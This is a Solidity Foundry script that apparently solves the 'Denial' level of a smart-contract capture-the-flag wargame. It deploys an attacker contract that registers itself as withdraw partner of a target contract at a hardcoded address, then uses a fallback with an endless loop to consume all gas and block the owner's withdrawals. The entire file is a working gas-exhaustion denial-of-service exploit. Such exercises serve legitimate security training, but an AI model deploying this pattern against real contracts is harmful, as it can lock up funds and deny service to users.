// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../src/20_Denial.sol";
import {Script, console} from "forge-std/Script.sol";

contract DenialSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack();
        vm.stopBroadcast();
    }
}

contract Attack {
    Denial denail = Denial(payable(0x988988ED612e16DE06AD0809c725BCc05AB6C502));
    uint256 i;

    constructor() {
        console.log("Denail Balance#", address(denail).balance);
        denail.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (i >= 0) {
            i++;
        }
    }
}
